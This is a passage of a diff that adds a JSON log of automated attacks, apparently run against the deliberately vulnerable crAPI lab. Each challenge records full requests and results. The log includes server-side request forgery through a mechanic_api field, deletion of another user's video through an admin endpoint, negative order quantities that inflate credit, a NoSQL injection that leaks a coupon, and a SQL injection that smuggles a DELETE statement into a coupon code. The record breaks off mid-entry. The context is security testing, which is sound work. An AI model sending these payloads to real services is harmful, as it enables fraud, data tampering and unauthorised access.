+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "x",
+                "vin": "29H4950666068889U",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":350,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "x",
+                "vin": "29H4950666068889U",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":351,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "x",
+                "vin": "29H4950666068889U",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":352,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "x",
+                "vin": "29H4950666068889U",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":353,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "x",
+                "vin": "29H4950666068889U",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":354,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "x",
+                "vin": "29H4950666068889U",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":355,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "x",
+                "vin": "29H4950666068889U",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":356,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZGM1ZmE5OTJAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDYsImV4cCI6MTc5MDgxNjkwNiwicm9sZSI6InVzZXIifQ.oD6SsAl3bKs453X4w5fOZyQ4eYbQxDSAsmwUwt2HrF0-S7vAgf0GQ2EXLuXsz7uSHFyVFTCeWpaRgokZ-1IgHr8Ph0_a0rXfT2MSCkuHKVEGmaKQkdDhXy87V-RNZGbDPQdFiu8olNyYwruNbUjCAk0V4uw3B31bHzd8JXA5-XtWwxBXoa1lbYhlM6vwrOTnew2wSk9SZYTAcmaNjIsf1awMp_f3l29mEAwIzLi3JyZXUO9xSXbeDWfuTxDbIfUAPoJ2Ye4ThmN4Iixepa1mJGHBjZt3N7eRDrj9I6SGv-791uAaJyuP5VmPrDi70yRY46CWPjejbSAPf_sPPxI4vg",
+              "body": {
+                "mechanic_code": "TRAC_JHN",
+                "problem_details": "x",
+                "vin": "29H4950666068889U",
+                "mechanic_api": "http://127.0.0.1:8888/workshop/api/mechanic/receive_report",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":{\"id\":357,\"sent\":true,\"report_link\":\"http://127.0.0.1:8888/workshop/api/mechanic/mechanic_"
+          }
+        ],
+        "evidence": "[200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200, 200]"
+      },
+      {
+        "challenge": "ch7_bfla_delete_video",
+        "solved": true,
+        "requests": 5,
+        "seconds": 0.43,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Victim",
+              "email": "victim-aeee9160@example.com",
+              "number": "9108348352"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "victim-aeee9160@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tYWVlZTkxNjBAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDcsImV4cCI6MTc5MDgx"
+          },
+          {
+            "op": "signup",
+            "params": {
+              "name": "Attacker",
+              "email": "attacker-ae09d045@example.com",
+              "number": "9216019293"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "attacker-ae09d045@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci1hZTA5ZDA0NUBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwNywiZXhwIjoxNzkw"
+          },
+          {
+            "op": "upload_video",
+            "status": 200,
+            "snippet": "70"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "DELETE",
+              "path": "/identity/api/v2/admin/videos/70",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci1hZTA5ZDA0NUBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwNywiZXhwIjoxNzkwODE2OTA3LCJyb2xlIjoidXNlciJ9.lZNPknhCEyn26Zq86zBEGoCP-WRoA9L6Vx6uSXX4qR-hFyvRXsVSp9XhkcAWSgo5tHKmusQtfKihXRqJ6ShRY-DkUTDaD-3YZhkxn1KioroTqexrYdPgpkXOke4bU7pqi7tF8mypgrSOO5q_hGd6WmLMB872CP0uDIjJrrO6A5dKKMCMU42_Q2vjOLstCdbCtq0Uweys6ZgUJdNervCKEZP9R3DtlcNqNOGxnxUf60nVoGVlFHF5gNnHXvfcZUMrLBzXZLGFAD6RWIZi5ciYgy1cXexlU3h-1_GaCFOuKWX5rzoMEXv9gpfLg03pmFaOjnuqMeT1Nn5RlpzJ-SiO4g"
+            },
+            "status": 200,
+            "snippet": "{\"message\":\"User video deleted successfully.\",\"status\":200}"
+          }
+        ],
+        "evidence": "{\"message\":\"User video deleted successfully.\",\"status\":200}"
+      },
+      {
+        "challenge": "ch8_mass_assignment_free",
+        "solved": true,
+        "requests": 3,
+        "seconds": 0.25,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Attacker",
+              "email": "attacker-37e3a39a@example.com",
+              "number": "9728558184"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "attacker-37e3a39a@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0zN2UzYTM5YUBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwNywiZXhwIjoxNzkw"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/shop/orders",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0zN2UzYTM5YUBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwNywiZXhwIjoxNzkwODE2OTA3LCJyb2xlIjoidXNlciJ9.W5-Fdc8hBIqeBgsYBB-6qH7pga9e2rWl9hW2U2VYg8ZYRxrSTvt_qRd5GGIqSXhKzDYuqZVyxJGiKWjosANki5p7QB3i8jyTwBguh4t2zZ35ve-jpX5_s8TILQojpKsfCywMFDBxIPeiLMhi_7IUvv19HVc20i2yMFtCLE7Doyap0H5ZK7_GYroV2qE2iMK_1exnMcGESZh9gHlN2C2p-HZ9-kIfGAupsBbpcKKjLa1bdnebJagKpiNGQLxnkqJ_RZr5bYeQzUlwsg7w0JjbB270n389CIet8hAVv1QhnjSqTHpixsgGQ4gg3enIC5VZZSnwAqliq8agJ6RMaa18hA",
+              "body": {
+                "product_id": 1,
+                "quantity": -1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"id\":48,\"message\":\"Order sent successfully.\",\"credit\":110.0}"
+          }
+        ],
+        "evidence": "{\"id\":48,\"message\":\"Order sent successfully.\",\"credit\":110.0}"
+      },
+      {
+        "challenge": "ch9_mass_assignment_balance",
+        "solved": true,
+        "requests": 3,
+        "seconds": 0.2,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Attacker",
+              "email": "attacker-57c22277@example.com",
+              "number": "9677957818"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "attacker-57c22277@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci01N2MyMjI3N0BleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwOCwiZXhwIjoxNzkw"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/shop/orders",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci01N2MyMjI3N0BleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwOCwiZXhwIjoxNzkwODE2OTA4LCJyb2xlIjoidXNlciJ9.FzUpeif84db0XH1pHPDSctNn0at523iia-eAi4keEobDer1y4-YbV-rDKw4aJNrSviXipW8hmnikgWQCWsFVtrwmSm3zBHEM03QW7BF3L29dftpIs9apVpqXFccp9yGA8eqM4nV0vaZmBXq2tLQIsnMiHKeZF7gMhD8mmqBA1-AZg537yboazEs0zItytXND8vK_fH2MI6OhkNIw6tU1hsk3_P3edqVoC2QvLDFk45zjx7gCXvA9Jdv11OxmPc9nQNZXZkgmui0v4bsCFheyhpgt2t7jf3U67kyHoM-7S4DUmwvnk-4wZvZn7z0O_0mW7Cm81xWo_08r6lU-mslsZA",
+              "body": {
+                "product_id": 1,
+                "quantity": -100
+              }
+            },
+            "status": 200,
+            "snippet": "{\"id\":49,\"message\":\"Order sent successfully.\",\"credit\":1100.0}"
+          }
+        ],
+        "evidence": "{\"id\":49,\"message\":\"Order sent successfully.\",\"credit\":1100.0}"
+      },
+      {
+        "challenge": "ch10_update_video_props",
+        "solved": true,
+        "requests": 3,
+        "seconds": 0.17,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Victim",
+              "email": "victim-f9feb7fa@example.com",
+              "number": "9025144057"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "victim-f9feb7fa@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZjlmZWI3ZmFAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDgsImV4cCI6MTc5MDgx"
+          },
+          {
+            "op": "upload_video",
+            "status": 200,
+            "snippet": "71"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "PUT",
+              "path": "/identity/api/v2/user/videos/71",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ2aWN0aW0tZjlmZWI3ZmFAZXhhbXBsZS5jb20iLCJpYXQiOjE3OTAyMTIxMDgsImV4cCI6MTc5MDgxNjkwOCwicm9sZSI6InVzZXIifQ.qKOnPBH_qva_jWw-YU2xBEzubKba3K3knkXkOfvy3ZwbJewgj3kLFtc_5VPMghX5jmwoiB0lu4IDDWHzrdgwBUJk9hbIjlAVdwdxK_VOS-1EzKn7BFxGPGrCpPK9CQiQHmzC1U3HNfqwi36qSTHS6kZY9hVeMOyXCC9iEWsZ1npMHxyirySs9swqDHPAJP_KdUNSBP--OsUarVXRRr72WddSdCqbkllyEV7ASpIp-C3vNHVbkblqGqWn1kgiCBGWE5ejX2Xpg_wA7N6iXXsMBGPdIwxp8PhP8XlBG-dXNDJTbAeULSHe7Lw358f8bbgtC_0Wxxs1scb-825Kjz8YqQ",
+              "body": {
+                "videoName": "hacked.mp4"
+              }
+            },
+            "status": 200,
+            "snippet": "{\"id\":71,\"video_name\":\"hacked.mp4\",\"conversion_params\":\"-v codec h264\",\"profileVideo\":\"data:image/jpeg;base64,ZHVtbXk=\"}"
+          }
+        ],
+        "evidence": "{\"id\":71,\"video_name\":\"hacked.mp4\",\"conversion_params\":\"-v codec h264\",\"profileVideo\":\"data:image/jpeg;base64,ZHVtbXk=\"}"
+      },
+      {
+        "challenge": "ch11_ssrf",
+        "solved": true,
+        "requests": 3,
+        "seconds": 0.19,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Attacker",
+              "email": "attacker-f6a2d54b@example.com",
+              "number": "9278266298"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "attacker-f6a2d54b@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci1mNmEyZDU0YkBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwOCwiZXhwIjoxNzkw"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/merchant/contact_mechanic",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci1mNmEyZDU0YkBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwOCwiZXhwIjoxNzkwODE2OTA4LCJyb2xlIjoidXNlciJ9.e6c7QWavTczt1s82aqwLdB_fDZfaY20pJUuL70uomQTsMMRcYHHqhcCofV0JOLeFPqlATMm9a5Tyx7ulnXeuc4By7gOc5yDk8y7CLIgotY6Lgdf-LtsgyrYxzwv8DhoeSpgI0O1siFO4TkBlD8B5GV1Xl4IJ81liH6sfYDC_ODowyUoL92aqDnxj3-3arTN7OmjDpHArfPZKmJceqSTGaLcGBaTZiZRvsoTBHXUeuuoNLnpykHjxZpzu9e0AqlKi-RSW-wKCe3fox1UWGvp2HTkfifljK1xYhuM17XLrIVzobvGyr_6J54Y-Kd2A6kZsdNwmrqtnt8E5pQw3Ve3TUw",
+              "body": {
+                "mechanic_api": "http://crapi-web/health",
+                "repeat_request_if_failed": false,
+                "number_of_repeats": 1
+              }
+            },
+            "status": 200,
+            "snippet": "{\"response_from_mechanic_api\":\"OK\",\"status\":200}"
+          }
+        ],
+        "evidence": "{\"response_from_mechanic_api\":\"OK\",\"status\":200}"
+      },
+      {
+        "challenge": "ch12_nosqli_coupon",
+        "solved": true,
+        "requests": 3,
+        "seconds": 0.16,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Attacker",
+              "email": "attacker-13d8fe57@example.com",
+              "number": "9352453632"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "attacker-13d8fe57@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0xM2Q4ZmU1N0BleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwOCwiZXhwIjoxNzkw"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/community/api/v2/coupon/validate-coupon",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0xM2Q4ZmU1N0BleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwOCwiZXhwIjoxNzkwODE2OTA4LCJyb2xlIjoidXNlciJ9.LLIpGMhTgP9i81pL1EMO2wMUfDKIELgScvh3OX721vwML4E1jbCQKPa1aH8QwHBU0-LKrlJK015Ha0B89ZBvsbN669aPjjaZYEv6G9I1FOSfePFwxQ8xizI4Wu70PY5g_F-3dGUX9yshjHZEaj1Nu0ruMmIbcvDjIBBDq_LDt_ANJfdCYK7DXT_j-_2A_laW10JURUhnTnrelCQ3Dcky-ZA94tQJOsXuB-ypvdNSqdl659hI1Ql13n7W9Hja1lMR5RlKKER7KMA0R3lgoe5dpgrYzyzZrCatsGiTxiTp-OsYdF3fU7TyoyAQhkcy__RCWQ-MCobN8M72GIwpjQsMGw",
+              "body": {
+                "coupon_code": {
+                  "$ne": ""
+                }
+              }
+            },
+            "status": 200,
+            "snippet": "{\"coupon_code\":\"TRAC075\",\"amount\":\"75\",\"CreatedAt\":\"2026-09-23T00:27:18.158Z\"}\n"
+          }
+        ],
+        "evidence": "{\"coupon_code\":\"TRAC075\",\"amount\":\"75\",\"CreatedAt\":\"2026-09-23T00:27:18.158Z\"}\n"
+      },
+      {
+        "challenge": "ch13_sqli_coupon",
+        "solved": true,
+        "requests": 6,
+        "seconds": 1.23,
+        "audit": [
+          {
+            "op": "signup",
+            "params": {
+              "name": "Attacker",
+              "email": "attacker-168cf7d0@example.com",
+              "number": "9560848316"
+            },
+            "status": 200,
+            "snippet": "{'message': 'User registered successfully! Please Login.', 'status': 200}"
+          },
+          {
+            "op": "login",
+            "params": {
+              "email": "attacker-168cf7d0@example.com"
+            },
+            "status": 200,
+            "snippet": "{'token': 'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0xNjhjZjdkMEBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwOCwiZXhwIjoxNzkw"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/shop/apply_coupon",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0xNjhjZjdkMEBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwOCwiZXhwIjoxNzkwODE2OTA4LCJyb2xlIjoidXNlciJ9.Xq8oyqQC_W3fC2v9uFItR8PKjggOT8tExRwf4SqlHMVl3qbdueUwrJlb3XL3rCk0tcWUN9ldmxBKnmlPGAWy1uvqtFV1nZoWgpvcH5XDRNuFNDHR6ixd19yAEU0ar2hlmkTlHU_h78BntKy9pW5ylGUsvc0f3jqu6Kk2uni1iwrA0SJZmlpBd3-macV4SgWH0B221tor_xNa0u5G15mS-8qrOATH7trdQ1jqQeVhPQOEp7QDeNz3Wi1-Xwj9Gt5esmV6kCP8suPqyNbX4vozVRUj2BXlbeM1J9WmaYYWhyOnNgLmydILgQ6cOSP3c5aLy0yYrg9LrhIKbk9EZ4h_9w",
+              "body": {
+                "coupon_code": "TRAC075",
+                "amount": 75
+              }
+            },
+            "status": 200,
+            "snippet": "{\"credit\":175.0,\"message\":\"Coupon successfully applied!\"}"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/shop/apply_coupon",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0xNjhjZjdkMEBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwOCwiZXhwIjoxNzkwODE2OTA4LCJyb2xlIjoidXNlciJ9.Xq8oyqQC_W3fC2v9uFItR8PKjggOT8tExRwf4SqlHMVl3qbdueUwrJlb3XL3rCk0tcWUN9ldmxBKnmlPGAWy1uvqtFV1nZoWgpvcH5XDRNuFNDHR6ixd19yAEU0ar2hlmkTlHU_h78BntKy9pW5ylGUsvc0f3jqu6Kk2uni1iwrA0SJZmlpBd3-macV4SgWH0B221tor_xNa0u5G15mS-8qrOATH7trdQ1jqQeVhPQOEp7QDeNz3Wi1-Xwj9Gt5esmV6kCP8suPqyNbX4vozVRUj2BXlbeM1J9WmaYYWhyOnNgLmydILgQ6cOSP3c5aLy0yYrg9LrhIKbk9EZ4h_9w",
+              "body": {
+                "coupon_code": "TRAC075",
+                "amount": 75
+              }
+            },
+            "status": 400,
+            "snippet": "{\"message\":\"TRAC075 Coupon code is already claimed by you!! Please try with another coupon code\"}"
+          },
+          {
+            "op": "http",
+            "params": {
+              "method": "POST",
+              "path": "/workshop/api/shop/apply_coupon",
+              "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlci0xNjhjZjdkMEBleGFtcGxlLmNvbSIsImlhdCI6MTc5MDIxMjEwOCwiZXhwIjoxNzkwODE2OTA4LCJyb2xlIjoidXNlciJ9.Xq8oyqQC_W3fC2v9uFItR8PKjggOT8tExRwf4SqlHMVl3qbdueUwrJlb3XL3rCk0tcWUN9ldmxBKnmlPGAWy1uvqtFV1nZoWgpvcH5XDRNuFNDHR6ixd19yAEU0ar2hlmkTlHU_h78BntKy9pW5ylGUsvc0f3jqu6Kk2uni1iwrA0SJZmlpBd3-macV4SgWH0B221tor_xNa0u5G15mS-8qrOATH7trdQ1jqQeVhPQOEp7QDeNz3Wi1-Xwj9Gt5esmV6kCP8suPqyNbX4vozVRUj2BXlbeM1J9WmaYYWhyOnNgLmydILgQ6cOSP3c5aLy0yYrg9LrhIKbk9EZ4h_9w",
+              "body": {
+                "coupon_code": "TRAC075'; DELETE FROM applied_coupon WHERE coupon_code='TRAC075'; SELECT coupon_code FROM applied_coupon WHERE '1'='2",
+                "amount": 75
+              }
+            },
